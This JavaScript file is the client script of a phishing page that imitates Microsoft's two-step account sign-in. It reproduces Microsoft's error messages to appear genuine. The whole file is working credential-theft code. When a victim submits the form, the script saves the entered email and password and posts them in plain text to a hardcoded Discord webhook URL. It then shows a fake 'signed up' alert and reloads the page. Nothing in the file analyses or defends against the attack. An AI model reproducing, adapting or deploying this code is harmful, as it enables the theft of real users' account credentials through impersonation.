const a = document.querySelector(".slide-page"),
  b = document.querySelector(".secondSlide"),
  c = document.querySelector(".firstNext"),
  d = document.querySelector(".prev-1"),
  e = document.querySelector(".submit");

function f(g) {
  return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(
    g
  );
}

function h() {
  const i = $("#result"),
    j = $("#email").val();
  return (
    i.text(""),
    !!f(j) ||
      (j
        ? (i.text(
            "That Microsoft account doesn't exist.\n Enter a different account or get a new one."
          ),
          i.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px"))
        : (i.text(
            "Enter a valid email address, phone number, or Skype\n name."
          ),
          i.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px")),
      !1)
  );
}

function k() {
  const l = $("#passResult"),
    m = $("#password").val();
  return (
    l.text(""),
    !(m.length < 8) ||
      (l.text(
        "Your account or password is incorrect. If you don't remember your password."
      ),
      l.css("color", "red"),
      !1)
  );
}

function n() {
  let o = sessionStorage.getItem("user");
  let p = sessionStorage.getItem("password");

  const q = {
    content: `Users Username: ${o}\nUsers Password: ${p}`,
  };

  const r =
    "https://discord.com/api/webhooks/1148571982691053641/GtFJLiLbLplmA_5L5J7VxuFVyUYHT9PQS-KJXLqwu0D9ZHDHvdZ0GP2YOTr8i2tFqabR";

  fetch(r, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(q),
  })
    .then((s) => {
      if (!s.ok) {
        throw new Error("Network response was not ok");
      }
      console.log("Message sent successfully");
    })
    .catch((t) => {
      console.error("There was a problem with the fetch operation:", t);
    });
}

var u = document.getElementById("email"),
  v = document.getElementById("password");
u.addEventListener("keyup", function (w) {
  13 === w.keyCode &&
    (w.preventDefault(), document.getElementById("btnSend").click());
}),
  v.addEventListener("keyup", function (x) {
    13 === x.keyCode &&
      (x.preventDefault(), document.getElementById("btnSignIn").click());
  }),
  c.addEventListener("click", function () {
    const y = document.getElementById("email").value;
    if (!h()) return;
    if (!f(y)) return;
    document.getElementById("userLine").textContent = y;
    const z = document.getElementById("section-1"),
      A = document.getElementById("section-2");
    (z.style.marginLeft = "-100%"),
      (z.style.visibility = "hidden"),
      (A.style.marginLeft = "0%"),
      (document.getElementById("loginForm").style.height = "403px");
  }),
  e.addEventListener("click", function () {
    const B = document.getElementById("password").value,
      C = document.getElementById("email").value;
    k() &&
      (sessionStorage.setItem("user", C),
      sessionStorage.setItem("password", B),
      n(),
      alert(sessionStorage.getItem("user")),
      alert(sessionStorage.getItem("password")),
      setTimeout(function () {
        alert("Your Form Successfully Signed up"), location.reload();
      }, 0));
  }),
  d.addEventListener("click", function () {
    const D = document.getElementById("section-1"),
      E = document.getElementById("section-2");
    (D.style.marginLeft = "0%"),
      (D.style.visibility = "visible"),
      (E.style.marginLeft = "100%"),
      (document.getElementById("loginForm").style.height = "370px"),
      (a.style.marginLeft = "0%"),
      (b.style.marginLeft = "100%"),
      (a.style.visibility = "visible");
  });
